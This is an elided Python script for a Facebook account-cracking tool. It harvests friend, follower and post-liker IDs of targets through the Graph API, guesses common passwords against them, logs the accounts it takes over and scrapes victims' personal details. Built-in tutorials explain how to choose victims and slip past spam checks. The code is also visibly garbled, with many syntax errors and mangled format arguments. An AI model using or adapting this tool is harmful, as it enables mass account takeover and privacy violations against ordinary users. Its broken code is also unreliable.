...
def menu_log():
    ...
    banner()
    var_menu()
    pmu = input('%s╠══[%s•%s] %sChoose : '%(T,A,J,4))
    print('%s║'%(O))
    if pmu in ['']:
        jalan('%s╚══[%s!%s] %sFILL IN CORRECTLY'%(T,A,J,4))
        menu_log()
        ...
        if pf in ['']:
            ...
            os.system('xdg-open https://facebook.com/Pranto.AHmeD.007')
            input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
            menu_log()
        elif pf in ['2','02','002','b']:
            os.system('xdg-open https://facebook.com/Pranto.AHmeD.00')
            input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
            menu_log()
...
def menu():
    ...
    try:
        ...
        ip = " "
    print('%s╔══[ %sWellcome %s %s]'%(T,A,J,4))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sID : %s'%(T,A,J,4,i))
    print('%s╠══[%s•%s] %sIP : %s'%(T,A,J,4,ip))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sStatus : %s'%(T,A,J,P,status))
    print('%s╠══[%s•%s] %sName : %s'%(T,A,J,4,users))
    print('%s╠══[%s•%s] %sEmail : %s'%(T,A,J,4,maile))
    print('%s╠══[%s•%s] %sKey : %s'%(T,A,J,4,kunci))
    print('%s╠══[%s•%s] %sJoin Since : %s'%(T,A,J,4,,bergabung))
    print('%s╠══[%s•%s] %sValid until : %s'%(T,A,J,4,kadaluarsa))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack From Public %s'%(T,A,J,4,jid))
    print('%s╠══[%s2%s] %sCrack From Follower %s'%T,A,J,4,jid))
    print('%s╠══[%s3%s] %sCrack From likes post %s'%(T,A,J,4,jid))
    print('%s╠══[%s4%s] %sRetrieve Target Data'%(T,A,J,4,))
    print('%s╠══[%s5%s] %sTaking Number of Friends %s'%(T,A,J,4,pro))
    print('%s╠══[%s6%s] %sCheck Crack Results'%(O,P,O,P))
    print('%s╠══[%s7%s] %sCheck Crack Result Options %s'%(T,A,J,4,pro))
    print('%s╠══[%s8%s] %sUser Agent'%(T,A,J,4,))
    print('%s╠══[%s9%s] %s%s'%(T,A,JP,upgrade))
    print('%s╠══[%s0%s] %sLog Out'%(T,A,J,P))
    pm = input('%s╠══[%s•%s] %sChoose : '%(T,A,J,4,))
    print('%s║'%(O))
    if pm in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
...
def ugen():
    ...
    print('%s║'%(O))
    if pmu in[""]:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(T,A,J,4,))
        menu()
    elif pmu in ['1','01','001','a']:
        ...
        try:
            ...
            ugent.write(ua)
            ugent.close()
            jalan("\n%s╔══[ %sSuccesfully Changed User Agent %s]"%(T,A,J,4,))
            print('%s║'%(O))
            input('%s╚══[ %sReturn %s]%s'%(T,A,J,4,))
            menu()
        except (KeyError,IOError):
            jalan("\n%s╔══[ %sFailed to Change User Agent %s]"%(T,A,J,4,))
            print('%s║'%(M))
            input('%s╚══[ %sBack %s]%s'%(T,A,J,4,))
            menu()
    elif pmu in ['3','03','003','c']:
        ...
        os.system("rm -rf ugent.txt")
        jalan("%s╠══[ %sUser Agent Deleted Successfully %s]"%T,A,J,4,))
        print('%s║'%(O))
        input('%s╚══[ %sReturn %s]%s'%(T,A,J,4,))
        menu()
        ...
        jalan("\n%s╔══[ %sThis is your current user agent %s]"%(T,A,J,4,))
        print('%s║'%(O))
        input('%s╚══[ %sReturn %s]%s'%(T,A,J,4,))
        menu()
...
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s╠══[%s1%s] %sXiaomi'%(T,A,J,4))
    print('%s╠══[%s2%s] %sNokia'%(T,A,J,4))
    print('%s╠══[%s3%s] %sAsus'%(T,A,J,4))
    print('%s╠══[%s4%s] %sHuawei'%(T,A,J,4))
    print('%s╠══[%s5%s] %sVivo'%(T,A,J,4)
    print('%s╠══[%s6%s] %sOppo'%(T,A,J,4P))
    print('%s╠══[%s7%s] %sSamsung'%(T,A,J,4))
    print('%s╠══[%s8%s] %sWindows'%(T,A,J,4))
    pc = input('%s╠══[%s•%s] %sChoose : '%(T,A,J,4))
    print('%s║'%(O))
    if pc in['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(T,A,J,4P));menu()
    elif pc in ['1','01']:
    ...
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(T,A,J,4));menu()
...
def publik():
    try:
        ...
        jalan('%s╚══[%s!%s] %sConnection Problem'%(T,A,J,4)
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        ...
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(T,A,J,4))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sConnection Problem'%(T,A,J,4))
        exit()
    try:
        print('%s╠══[%s•%s] %sINPUT ID'%(T,A,J,4))
        it = input("%s╠══[%s•%s] %sID Target : "%(T,A,J,4))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sName : %s'%(T,A,J,4ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Not Found'%(T,A,J,4))
            menu()
        ...
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(T,A,J,4,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(T,A,J,4,e))
def pengikut():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
...
def likers():
    ...
    try:
        ...
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sName : %s'%(T,A,J,4,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Not Found'%(M,P,M,P))
            menu()
        ...
        for a in z["data"]:
            ...
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(T,A,J,4,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))
...
def tambah_pass():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sFor Example :  pakistan,pakistan123,123456,786786'%(T,A,J,4))
    cuy = input('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(T,A,J,4))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
...
class crack:
    def __init__(self,files):
        ...
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %sCrack With Password Default/Manual [d/m]'%(T,A,J,4))
        while True:
            f = input('%s╠══[%s•%s] %sChoose : '%(T,A,J,4))
            if f=="":
                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(T,A,J,4))
                menu()
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r%s[%sR4A33Z-CP%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                    ...
                    print("\r%s[%sR4A33Z-CP%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sR4A33Z-OK%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sR4A33Z-OK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sR4A33Z-CP%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                    ...
                    h_cp = "\r%s[%sR4A33Z-CP%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sD3M09-CP%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sR4A33Z%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
...
def target():
    ...
    jalan('%s╠══[%s•%s] %sNAME           : %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sFIRST NAME     : %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sMIDDLE NAME    : %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sLAST NAME      : %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sBIRTHDAY       : %s'%(T,A,J,4)
    jalan('%s╠══[%s•%s] %sGENDER         : %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sEMAIL          : %s'%(T,A,J,4)
    jalan('%s╠══[%s•%s] %sLINK           : %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sUSERNAME       : %s'%(OT,A,J,4))
    jalan('%s╠══[%s•%s] %sMERETIAL STATUS: %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sRELARION WITH  : %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sCURRENT CITY   : %s'%(T,A,J,4))
    jalan('%s╠══[%s•%s] %sHOMETOWN       : %s'%(T,A,J,4,O,P,ht))
    jalan('%s╠══[%s•%s] %sABOUT          : %s'%(T,A,J,4,P,ab))
    jalan('%s╠══[%s•%s] %sLOCALE         : %s'%(T,A,J,4,lo))
    print('%s║'%(O))
    input('%s╚══[ %sReturn %s]%s'%(T,A,J,4)
    menu()
def teman_target():
    ...
    tt=[]
    te=[]
    lim = input('%s╠══[%s•%s] %sLimit Dump : '%(T,A,J,4))
    print('%s║%s'%(O,P))
...
def hasil():
    clear()
    banner()
    jalan('%s╔══[ %sCrack Results %s]'%(T,A,J,4))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCheck Result OK'%(T,A,J,4))
    print('%s╠══[%s2%s] %sCheck result CP'%(T,A,J,4))
    ch = input('%s╠══[%s•%s] %sChoose : '%(T,A,J,4))
    if ch in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(T,A,J,4))
        menu()
...
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sPrepare a Sacrificial Account In Chrome For Cracking Process %s║'%(T,A,J,4))
    mlaku('%s║ %s2 %s║ %sChange the Victim Account Password First          %s║'%(T,A,J,4))
    mlaku('%s║ %s3 %s║ %sFind Random Account Targets, Friends List Must Be Public   %s║'%(T,A,J,4))
    mlaku('%s║ %s4 %s║ %sFriends (FL) Free, Can be 1K, 2K, 3K, ,4K, Or 5K      %s║'%(T,A,J,4))
    mlaku('%s║ %s5 %s║ %sMore Friends, More Possible Results  %s║'%(T,A,J,4))
    mlaku('%s║ %s6 %s║ %sTap Target Profile/Cover Photo                      %s║'%(T,A,J,4))
    mlaku('%s║ %s7 %s║ %ssee URL/Link Above, There is \ id = 10001xx\ %s║'%(T,A,J,4))
    mlaku('%s║ %s8 %s║ %sWell, thats a target ID ready to crack   %s║'%(T,A,J,4))
    mlaku('%s║ %s9 %s║ %sOpen Termux/Linux then proceed to the Crack Process %s║'%(T,A,J,4))
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def tutor_crack():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
    mlaku('%s║ %s1 %s║ %sMethod Api : Fast But Easy Process Spam            %s║'%(T,A,J,4))
    mlaku('%s║ %s2 %s║ %sMethod Mbasic : The process is quite fast, rarely spammed  %s║'%(T,A,J,4))
    mlaku('%s║ %s3 %s║ %sMethod Mobile : Slow Process, Probably OK  %s║'%(T,A,J,4))
    mlaku('%s║ %s4 %s║ %sCrack Using Data Quota (Not Support Wifi)  %s║'%(T,A,J,4))
    mlaku('%s║ %s5 %s║ %sIf Results Do Not Appear While The Crack Is Running       %s║'%(T,A,J,4))
    mlaku('%s║ %s6 %s║ %sTurn On Airplane Mode Only 5 Seconds                   %s║'%(T,A,J,4)
    mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
    print('%s║'%(O))
def var_author():
    mlaku('%s╔══[ %sAuthor & Team Project %s]'%(T,A,J,4))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sAuthor :'%(T,A,J,4)
    mlaku('%s║     • %sD3M09'%(T,J))
    mlaku('%s║     • %sDAVID VAU'%(T,J))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNSCODE%s :'%(T,A,J,4))
    mlaku('%s║     • %sR4A33Z'%(O,P))
    mlaku('%s║     • %sRAZ VAU'%(O,P))
    mlaku('%s║     • %sMEHEDI HASAN'%(O,P))
    mlaku('%s║     • %sOPENSOURCE '%(O,P))
    mlaku('%s║     • %sNOOBZ TEAM'%(O,P))
    mlaku('%s║     • %sNOOBZ SQUAD'%(O,P))
    mlaku('%s║     • %sUNIQE FORCE'%(O,P))
    mlaku('%s║     • %sBD CYBER ZONE'%(O,P))
    mlaku('%s║     • %sR4ND0M'%(O,P))
    mlaku('%s║     • %sSHOYAIB'%(O,P))
    mlaku('%s║     • %sMAFIA KILLER 404'%(O,P))
    mlaku('%s║     • %sLONTHON'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
    print("%s╠══[%s1%s] %sGet User Agent"%(T,A,J,4))
    print("%s╠══[%s2%s] %sChange User Agent%s(%sManual%s)"%(T,A,J,4,P,O,P,O))
    print("%s╠══[%s3%s] %sChange User Agent %s(%sAdjust HP%s)"%(T,A,J,4,P,O,P,O))
    print("%s╠══[%s4%s] %sDelete User Agent"%(T,A,J,4))
    print("%s╠══[%s5%s] %sCheck User Agent"%(T,A,J,4))
    print("%s╠══[%s0%s] %sReturn"%(T,A,J,4))
def start_method():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sMethod Api'%(T,A,J,4))
    print('%s╠══[%s2%s] %sMethod Mbasic'%(T,A,J,4))
    print('%s╠══[%s3%s] %sMethod Free FB'%(T,A,J,4))
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sFast Crack %s[%s6 pass%s]'%(T,A,J,4,P,O,P,O))
    print('%s╠══[%s2%s] %sSlow Crack %s[%s9 pass%s]'%(T,A,J,4,P,O,P,O))
    print('%s╠══[%s3%s] %sVery Slow Crack %s[%s12 pass%s]'%(T,A,J,4,P,O,P,O))
    print('%s╠══[%s4%s] %sCrack Password Combine'%(T,A,J,4))
def started():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sCrack Is Running...'%(T,A,J,4))
    print('%s╠══[%s•%s] %sAccount [OK] Saved To OK/%s.txt'%(T,A,J,4,P,tanggal))
    print('%s╠══[%s•%s] %sAccount [CP] Saved To CP/%s.txt'%(T,A,J,4,P,tanggal))
